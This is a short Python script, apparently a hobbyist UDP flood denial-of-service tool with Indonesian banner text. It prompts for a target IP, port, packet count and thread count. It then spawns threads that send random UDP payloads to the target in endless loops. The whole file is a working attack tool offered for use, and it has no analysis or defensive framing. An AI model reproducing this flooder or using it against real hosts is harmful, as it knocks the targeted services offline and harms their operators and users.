import random

import socket

import threading

import os,sys



os.system("clear")

print('''TOOLS BY RYUU NOT ABUSE , YG ABUSE YATIM''')

ip = str(input("Ip  >>> :"))

port = int(input("Port  >>> :"))

choice = str(input("Ddos? (y/n) >>> :"))

times = int(input("Packet  >>> :"))

threads = int(input("Threads  >>> :"))



os.system("clear")

def run():

    data = random._urandom(1490)

    i = random.choice(("[•]","[•]","[•]"))

    while True:

        try:

            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

            addr = (str(ip),int(port))

            for x in range(times):

                s.sendto(data,addr)

            print(i +"Ngopi Ngab !!!")

        except:

            print("[X] Waduh Tembus !!!")



def run2():

    data = random._urandom(16)

    i = random.choice(("[•]","[•]","[•]"))

    while True:

        try:

            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

            s.connect((ip,port))

            s.send(data)

            for x in range(times):

                s.send(data)

            print(i +"Ngopi Ngab !!!")

        except:

            s.close()

            print("[X] Waduh Tembus !!!")



def run3():

    data = random._urandom(16)

    i = random.choice(("[•]","[•]","[•]"))

    while True:

        try:

            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

            s.connect((ip,port))

            s.send(data)

            for x in range(times):

                s.send(data)

            print(i +"Ngopi Ngab !!!")

        except:

            s.close()

            print("[X] Waduh Tembus !!!")



for y in range(threads):

    if choice == 'y':

        th = threading.Thread(target = run)

        th.start()

        th = threading.Thread(target = run2)

        th.start()

    else:

        th = threading.Thread(target = run3)

        th.start() 
